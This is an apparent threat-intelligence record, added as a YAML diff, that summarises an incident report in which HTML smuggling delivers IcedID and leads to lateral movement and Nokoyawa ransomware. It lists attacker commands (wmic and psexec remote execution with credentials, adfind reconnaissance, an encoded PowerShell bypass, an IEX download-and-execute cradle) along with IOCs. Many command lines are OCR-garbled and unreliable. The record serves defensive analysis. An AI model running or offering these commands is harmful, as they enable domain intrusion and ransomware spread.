@@ -1,0 +1,132 @@
+summary: The report details an attack leveraging HTML smuggling to deliver IcedID,
+  followed by lateral movement and deployment of Nokoyawa ransomware within a domain
+  environment.
+date: Unknown
+author: Unknown
+attribution: Unknown
+malware_families:
+- IcedID
+- Nokoyawa
+TTPs:
+  processs:
+  - cmd.exe
+  - wmic
+  - psexec.exe
+  - rundll32.exe
+  - adfind.exe
+  - powershell
+  - net.Webclient
+  commandline:
+  - cmd.exe /c copy \\18 178\cS\windows\ temp\k .exe c:\windows\temp\"1 WNIC. exe
+    wnic /node:"18 193" Juser \ " [password "
+  - 'process call create "cnd.exe /c copy \\18 178\cS\windows\ temp\k .exe c:\windows\temp\"1
+    WNIC. exe wnic /node:"18 228" Juser:" \ " [password: "'
+  - 'process call create "cnd.exe /c copy \\18 178\cS\windows\ temp\k .exe c:\windows\temp\"1
+    WNIC. exe wnic /node:"18 185" Juser:" \ " [password: "'
+  - process call create "cnd.exe /c copy \\18 178\cS\windows\ temp\k .exe c:\windows\temp\"1
+    WNIC. exe wnic /node 231" Juser \ .
+  - 'process call create "cnd.exe /c copy \\18 170\c$\windows\ temp\k .exe c:\windows\
+    temp!1 WNIC. exe wnic /node:"18 232" Juser:" \ " [password: "'
+  - process call create "cnd.exe /c copy \\18 178\cS\windows\ temp\k .exe c:\windows\temp\"1
+    WNIC. exe wnic /node 179" Juser \ .
+  - process call create "cnd.exe /c copy \\18 170\c$\windows\ temp\k .exe c:\windows\
+    temp!1 WNIC. exe wnic 186" \ .
+  - 'process call create "cnd.exe /c copy \\18 178\cS\windows\ temp\k .exe c:\windows\temp\"1
+    WNIC. exe wnic /node:"10 1817 Juser: \ " fpassword: process call create cnd.exe
+    /c copy \\18 176\c$\windows\ temp\k..exe c:\windows\temp\"process.command_line
+    + \Windows\system32\cnd. exeC:\Windows\systen32\cnd. exeC: \Windows\systen32\cnd.
+    exeC:\Windows\systen32\cmd. exe/K copy/K copy./K copy/K copy./K copyp-bat \\p-bat
+    \\p-bat \\p-bat \\171\c$\windows\temp\233\c$\windows\temp\187\c$\windows\temp\230\c$\windows\temp\230\c$\windows\
+    temp\eventcode'
+  - 'process call create "cnd.exe /c copy \\18 170\c$\windows\ temp\k .exe c:\windows\
+    temp!1 WNIC. exe wnic /node:"18 232" Juser:" \ " [password: "'
+  - 'process call create "cnd.exe /c copy \\16. 176\c$\windows\temp\p.bat c:\windows\temp\"1
+    WNIC. exe wnic /node:"10 233" Juser: \ " fpassword:"'
+  - 'process call create "cnd.exe /c copy \\16. 176\c$\windows\temp\p.bat c:\windows\temp\"1
+    WNIC. exe wnic /node:"10 187" Juser: \ * fpassword "'
+  - 'process call create "cnd.exe /c copy \\16. 176\c$\windows\temp\p.bat c:\windows\temp\"1
+    WNIC. exe wnic /node:"10 238" Juser: \ " fpassword: "'
+  - 'process call create "cnd.exe /c copy \\16. 176\c$\windows\temp\p.bat c:\windows\temp\"1
+    WNIC. exe wnic /node:"10 189 Juser: \ " fpassword: "'
+  - 'process call create "cnd.exe /c copy \\16. 176\c$\windows\temp\p.bat c:\windows\temp\"1
+    WNIC. exe wnic /node:"10 1937 Juser: \ " fpassword:"'
+  - 'process call create "cnd.exe /c copy \\16. 176\c$\windows\temp\p.bat c:\windows\temp\"1
+    WNIC. exe wnic /node:"10 228 Juser: \ " fpassword:"'
+  - process call create "cnd.exe /c copy \\16. 176\c$\windows\temp\p.bat c:\windows\temp\"1
+    WNIC. exe wnic /node 185" Juser \ * fpassword "
+  - 'process call create "cnd.exe /c copy \\16. 176\c$\windows\temp\p.bat c:\windows\temp\"1
+    WNIC. exe wnic /node:"10 2317 Juser: \ " fpassword: "'
+  - 'process call create "cnd.exe /c copy \\16. 176\c$\windows\temp\p.bat c:\windows\temp\"1
+    WNIC. exe wnic /node:"10 232 Juser: \ * fpassword "'
+  - 'process call create "cnd.exe /c copy \\16. 176\c$\windows\temp\p.bat c:\windows\temp\"1
+    WNIC. exe wnic /node:"10 1797 Juser: \ " fpassword:"'
+  - 'process call create "cnd.exe /c copy \\16. 176\c$\windows\temp\p.bat c:\windows\temp\"1
+    WNIC. exe wnic /node:"10 186" Juser: \ " fpassword:"'
+  - process call create "cnd.exe /c copy \\16. 176\c$\windows\temp\p.bat c:\windows\temp\"1
+    WNIC. exe wnic /node 181" Juser \ * fpassword "
+  - 'process call create "cnd.exe /c copy \\16. 176\c$\windows\temp\p.bat c:\windows\temp\"1
+    WNIC. exe wnic /node:"10 1957 Juser: \ " fpassword:"'
+  - 'process call create "cnd.exe /c copy \\16. 176\c$\windows\temp\p.bat c:\windows\temp\"1
+    WNIC. exe wnic /node:"10 229 Juser: \ * fpassword "'
+  - cmd.exe /c chep >&2systeminfo
+  - ipconfig /all
+  - nltest /domain_trusts /all_trusts
+  - net config workstation
+  - net view /all /domain
+  - net group "Domain Admins" /domain
+  - wmic /Node:localhost/Namespace:\\root\SecurityCenter2 PathAntiVirusProduct Get
+    * /Format:List
+  - cmd.exe /c net user <USER> /domain
+  - powershell -nop -exec bypass -EncodedCommand J Yen/=eSQBFAFgAIAACAE4AZQGB...
+  - adfind.exe -f (objectcategory=person)
+  - adfind.exe -f objectcategory=computer
+  - adfind.exe -f (objectcategory=organizationalUnit)
+  - adfind.exe -subnets -f (objectCategory=subnet)
+  - adfind.exe -f "(objectcategory=group)"
+  - adfind.exe -gcb -sc trustdmp
+  - 7.exe a -mx3 ad.7z ad_* del 7.exe adfind* ad_*
+  - cmd.exe /K copy p.bat \\<DC>\c$\windows\temp\
+  - psexec.exe \\<DC> -u <DOMAIN>\<USER> -p "<Password>" -s -d -h -r mstdc -accepteula
+    -nobanner c:\windows\temp\p.bat
+  - wmic /node:"<DC>" /user:"DOMAIN\USER" /password:"<Password>" process call create"cmd.exe
+    /c copy \\<DC>\c$\windows\temp\k.exe c:\windows\temp\"psexec.exe \\<DC> -u <DOMAIN>\<USER>
+    -p "<Password>" -s -d -h -r mstdc -accepteula -nobanner c:\windows\temp\p.bat
+  - wmic /node:"<IP>" /user:"<DOMAIN>\<USER>" /password:"<Password>" process call
+    create"cmd.exe /c c:\windows\temp\p.bat
+  powershell:
+  - IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:8897/'); Invoke-Session
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Security
+  network_connections:
+  - destination:
+    - 159.89.12.125:80
+  - destination:
+    - 5.8.18.242
+  - destination:
+    - 5.255.103.16
+  file_modifications:
+  - C:\Windows\Temp\7.exe
+  - C:\Users\<USER>\Downloads\8l1812d-65fd-48ee-b650-296122a21067.zip
+  - C:\Users\<USER>\AppData\Local\Temp\Templ_8c1812d-65fd-48ee-b650-296122a21067.zip\document-35068.iso
+  - C:\Users\<USER>\AppData\Local\jada.higgs\lzjeubawe4.dll
+  - C:\Windows\system32\cmd.exe
+  - C:\Windows\Temp\p.bat
+  - C:\Windows\Temp\k.exe
+  - C:\Windows\Temp\l.bat
+  - C:\Windows\Temp\2.bat
+  - C:\Windows\Temp\3.bat
+  - C:\Windows\Temp\4.bat
+  - C:\Windows\Temp\5.bat
+  - C:\Windows\Temp\e.bat
+  persistence:
+  - Scheduled Task for runningxcopy templates544.png C:\\Users\\<USER>\\AppData\\Local\\Temp\\16958.7166
+    /h /s /e
+IOCs:
+- 159.89.12.125
+- 5.8.18.242
+- 5.255.103.16
+- http://127.0.0.1:8897/
+- pikchayola.pics
+- questdisar.com
+reference: https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/
+file_creation_date: May 09, 2025
